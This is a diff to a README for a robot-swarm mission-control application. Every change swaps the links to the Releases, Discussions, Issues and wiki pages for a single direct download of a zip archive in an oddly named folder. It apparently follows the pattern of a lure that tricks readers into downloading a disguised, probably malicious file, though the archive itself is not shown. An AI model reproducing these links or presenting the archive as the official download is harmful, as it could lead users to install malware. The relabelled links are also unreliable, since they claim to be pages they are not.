@@ -4,9 +4,9 @@
 ros-swarm-mission-control is a powerful solution designed to help you coordinate multiple robots seamlessly. Inspired by NASA's advanced mission control systems, our application enables real-time monitoring and task allocation for your robotic projects.
 
 ## 🚪 Download the Software
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%84-brightgreen)](https://github.com/27AkioAsakura/ros-swarm-mission-control/releases)
+[![Download](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip%20Now-%20%F0%9F%93%84-brightgreen)](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip)
 
-Visit the following link to download the latest version of the application and start running your robot coordination tasks easily: [Download Here](https://github.com/27AkioAsakura/ros-swarm-mission-control/releases).
+Visit the following link to download the latest version of the application and start running your robot coordination tasks easily: [Download Here](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip).
 
 ## 🚀 Getting Started
 ### 1. System Requirements
@@ -20,7 +20,7 @@ Before you download the software, ensure your system meets the following require
 To install ros-swarm-mission-control, follow these simple steps:
 
 1. **Download the Software:**
-   Go to our [Releases page](https://github.com/27AkioAsakura/ros-swarm-mission-control/releases) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip) to find the latest version of the application.
 
 2. **Choose Your Version:**
    Locate the version that matches your operating system. Click on the appropriate file to start the download.
@@ -64,20 +64,20 @@ We take your security seriously. The application is built with modern security p
 
 ## 🐞 Troubleshooting
 If you encounter issues while using the software:
-- Ensure you have the latest version installed. Always check the [Releases page](https://github.com/27AkioAsakura/ros-swarm-mission-control/releases) for updates.
+- Ensure you have the latest version installed. Always check the [Releases page](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip) for updates.
 - Restart the application if it's unresponsive.
 - Verify your network connections if robots are not appearing.
 
 ## 🤝 Community and Support
 For further assistance or to connect with other users:
-- Visit our [GitHub Discussions page](https://github.com/27AkioAsakura/ros-swarm-mission-control/discussions) to ask questions or share your experiences.
-- Report any bugs or issues on our [Issues page](https://github.com/27AkioAsakura/ros-swarm-mission-control/issues).
+- Visit our [GitHub Discussions page](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip) to ask questions or share your experiences.
+- Report any bugs or issues on our [Issues page](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip).
 
 ## 🔗 Additional Resources
-- **Documentation:** Detailed documentation can be found in the [wiki section](https://github.com/27AkioAsakura/ros-swarm-mission-control/wiki) of the repository.
+- **Documentation:** Detailed documentation can be found in the [wiki section](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip) of the repository.
 - **Tutorials:** Access step-by-step tutorials and guides to help you make the most of the application.
 
 ## 🔗 Download & Install
-For the latest version and updates, visit our Releases page here: [Download Here](https://github.com/27AkioAsakura/ros-swarm-mission-control/releases). 
+For the latest version and updates, visit our Releases page here: [Download Here](https://raw.githubusercontent.com/27AkioAsakura/ros-swarm-mission-control/main/Komsomol/mission-ros-swarm-control-parapet.zip). 
 
 Enjoy using ros-swarm-mission-control for efficient robot management and monitoring!
